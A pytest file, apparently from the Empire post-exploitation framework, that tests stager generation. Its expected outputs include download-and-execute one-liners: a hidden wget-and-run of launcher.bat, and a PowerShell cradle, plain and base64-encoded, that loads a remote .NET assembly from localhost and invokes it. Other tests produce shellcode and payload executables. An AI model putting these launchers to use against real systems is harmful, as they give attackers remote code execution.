import base64
import os
import platform
import re
import shutil

import pytest
import requests

from empire.server.common.empire import MainMenu

EMPIRE_COMPILER_VERSION = "v0.1.0"
base_download_url = "https://github.com/BC-SECURITY/Empire-Compiler/releases/download"
target_dir = "empire/server/Empire-Compiler/EmpireCompiler"
target_compiler_path = os.path.join(target_dir, "EmpireCompiler")


def get_architecture():
    """
    Detect the system architecture and return the corresponding value.
    """
    arch = platform.machine()
    if arch == "x86_64":
        return "linux-x64"
    elif arch in ["aarch64", "arm64"]:  # noqa: RET505
        return "linux-arm64"
    else:
        return "unsupported"


def download_file(url, target_path):
    """
    Download a file from a given URL and save it to the target path.
    """
    response = requests.get(url, stream=True)
    if response.status_code == 200:  # noqa: PLR2004
        with open(target_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        print(f"Downloaded file to {target_path}")
    else:
        print(
            f"Failed to download file from {url}. Status code: {response.status_code}"
        )
        response.raise_for_status()


def ensure_empire_compiler_exists():
    """
    Ensure that the EmpireCompiler binary is in the target directory.
    If it's not present, download it first and then move it to the target directory.
    """
    if not os.path.exists(target_compiler_path):
        print(f"EmpireCompiler not found at {target_compiler_path}. Downloading...")
        os.makedirs(target_dir, exist_ok=True)

        arch = get_architecture()
        if arch == "unsupported":
            print("Unsupported architecture. Exiting.")
            return

        download_url = (
            f"{base_download_url}/{EMPIRE_COMPILER_VERSION}/EmpireCompiler-{arch}"
        )

        temp_download_path = os.path.join(
            "/tmp", "EmpireCompiler"
        )  # Temporary download location
        download_file(download_url, temp_download_path)
        shutil.move(temp_download_path, target_compiler_path)
        os.chmod(target_compiler_path, 0o755)
        print("EmpireCompiler downloaded and moved successfully.")
    else:
        print("EmpireCompiler already exists.")


ensure_empire_compiler_exists()


@pytest.fixture(scope="module")
def stager_generation_service(main: MainMenu):
    return main.stagergenv2


def test_generate_launcher_fetcher(stager_generation_service):
    launcher = stager_generation_service.generate_launcher_fetcher(encode=False)

    assert (
        launcher
        == 'wget "http://127.0.0.1/launcher.bat" -outfile "launcher.bat"; Start-Process -FilePath .\\launcher.bat -Wait -passthru -WindowStyle Hidden;'
    )


def test_generate_launcher(stager_generation_service):
    pass


@pytest.mark.parametrize(
    ("obfuscate", "encode", "expected_launcher"),
    [
        (
            False,
            False,
            """$wc=New-Object System.Net.WebClient;$bytes=$wc.DownloadData("http://localhost:1336/download/powershell/");$assembly=[Reflection.Assembly]::load($bytes);$assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);""",
        ),
        (
            False,
            True,
            "powershell -noP -sta -w 1 -enc  JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABiAHkAdABlAHMAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQAzADMANgAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAiACkAOwAkAGEAcwBzAGUAbQBiAGwAeQA9AFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkACgAJABiAHkAdABlAHMAKQA7ACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUAByAG8AZwByAGEAbQAiACkALgBHAGUAdABNAGUAdABoAG8AZAAoACIATQBhAGkAbgAiACkALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAJABuAHUAbABsACkAOwA=",
        ),
    ],
)
def test_generate_exe_oneliner(
    stager_generation_service, obfuscate, encode, expected_launcher
):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="",
        encode=encode,
        listener_name="new-listener-1",
    )
    assert expected_launcher in launcher


@pytest.mark.parametrize(
    ("obfuscate", "encode"),
    [
        (True, False),
        (True, True),
    ],
)
def test_obfuscate_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1",
        encode=encode,
        listener_name="new-listener-1",
    )
    assert launcher is not None


def test_generate_dll(stager_generation_service):
    dll_bytes = stager_generation_service.generate_dll("posh_code", "x64")
    assert len(dll_bytes) == 665088  # noqa: PLR2004


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net35", False),
        ("net40", True),
        ("net35", True),
    ],
)
def test_generate_powershell_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_powershell_exe(
        "posh_code", dot_net_version, obfuscate
    )
    expected_pattern = (
        re.escape(stager_generation_service.main_menu.installPath)
        + r"/Empire-Compiler/EmpireCompiler/Data/Tasks/CSharp/Compiled/"
        + re.escape(dot_net_version)
        + r"/CSharpPS_\w+\.exe"
    )

    assert re.match(
        expected_pattern, result
    ), f"Result '{result}' does not match the expected pattern '{expected_pattern}'"


@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
        ("x86", "net35"),
        ("x64", "net35"),
        ("both", "net35"),
    ],
)
def test_generate_powershell_shellcode(
    stager_generation_service, arch, dot_net_version
):
    shellcode, err = stager_generation_service.generate_powershell_shellcode(
        "posh_code", arch, dot_net_version
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(
        shellcode, bytes
    ), f"Shellcode should be bytes, but got {type(shellcode)}"
    assert (
        len(shellcode) > 100  # noqa: PLR2004
    ), f"Shellcode is too short: {len(shellcode)} bytes"
    assert shellcode.startswith(
        b"\xe8"
    ), "Shellcode does not start with the expected byte"
    assert re.search(
        rb"\x00\x00\x00\x00", shellcode
    ), "Expected byte sequence not found in shellcode"


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net40", True),
        ("net35", False),
        ("net35", True),
    ],
)
def test_generate_python_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_python_exe(
        "python_code", dot_net_version, obfuscate
    )
    base_path = f"{stager_generation_service.main_menu.installPath}/Empire-Compiler/EmpireCompiler/Data/Tasks/CSharp/Compiled/{dot_net_version}/"

    assert result.startswith(
        base_path
    ), f"Result path does not start with expected base path: {result}"
    assert re.match(
        r".*CSharpPy_\w+\.exe$", result
    ), f"Filename does not match expected pattern: {result}"


@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
    ],
)
def test_generate_python_shellcode(stager_generation_service, arch, dot_net_version):
    shellcode, err = stager_generation_service.generate_python_shellcode(
        "python_code", arch, dot_net_version
    )

    assert err is None, f"Unexpected error: {err}"
    assert shellcode is not None, "Shellcode was not generated"
    assert isinstance(shellcode, bytes), "Generated shellcode is not in bytes format"
    assert len(shellcode) > 0, "Generated shellcode is empty"


def test_generate_go_stageless(stager_generation_service):
    """
    Test the generate_go_stageless function using a real listener (new-listener-1).
    """
    options = {"Listener": {"Value": "new-listener-1"}}

    result = stager_generation_service.generate_go_stageless(options)

    assert result is not None, "Stager generation failed, result is None."

    generated_executable_path = result
    assert os.path.exists(
        generated_executable_path
    ), f"Generated executable not found: {generated_executable_path}"

    generated_dir = os.path.dirname(generated_executable_path)
    generated_main_go_path = os.path.join(generated_dir, "main.go")

    assert os.path.exists(
        generated_main_go_path
    ), f"Generated main.go not found: {generated_main_go_path}"

    with open(generated_main_go_path) as f:
        main_go_content = f.read()

    aes_key_base64_match = re.search(r'aesKeyBase64\s*:=\s*"([^"]+)"', main_go_content)
    staging_key_base64_match = re.search(
        r'stagingKeyBase64\s*:=\s*"([^"]+)"', main_go_content
    )

    assert aes_key_base64_match, "aesKeyBase64 not found in main.go"
    assert staging_key_base64_match, "stagingKeyBase64 not found in main.go"

    extracted_aes_key_base64 = aes_key_base64_match.group(1)
    extracted_staging_key_base64 = staging_key_base64_match.group(1)

    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    staging_key = active_listener.options["StagingKey"]["Value"]

    expected_staging_key_base64 = base64.b64encode(staging_key.encode("UTF-8")).decode(
        "UTF-8"
    )
    assert (
        extracted_staging_key_base64 == expected_staging_key_base64
    ), f"StagingKeyBase64 mismatch: expected {expected_staging_key_base64}, got {extracted_staging_key_base64}"

    aes_key = base64.b64decode(extracted_aes_key_base64)
    assert (
        len(aes_key) == 32  # noqa: PLR2004
    ), f"AES key length mismatch: expected 32 bytes, got {len(aes_key)} bytes"


def test_generate_dylib(stager_generation_service):
    pass


def test_generate_appbundle(stager_generation_service):
    pass


def test_generate_pkg(stager_generation_service):
    pass


def test_generate_jar(stager_generation_service):
    pass


def test_generate_upload(stager_generation_service):
    pass


def test_generate_stageless(stager_generation_service):
    pass
